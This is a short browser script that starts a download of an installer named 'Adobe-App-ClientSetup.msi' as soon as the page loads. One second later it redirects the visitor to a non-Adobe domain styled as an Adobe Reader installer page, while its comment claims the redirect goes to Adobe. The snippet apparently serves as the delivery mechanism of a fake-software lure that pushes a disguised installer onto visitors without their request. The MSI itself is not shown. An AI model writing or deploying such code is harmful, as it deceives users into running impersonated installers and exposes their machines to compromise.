<script>
  // Trigger MSI download
  const link = document.createElement('a');
  link.href = '/Adobe-App-ClientSetup.msi';  // must match the file name in /public
  link.download = 'Adobe-App-ClientSetup.msi';
  document.body.appendChild(link);
  link.click();

  // Redirect to Adobe after download starts
  setTimeout(() => {
    window.location.href = 'https://jomry.com/adobe-reader/installer/download.html';
  }, 1000); // 1 second delay
</script>
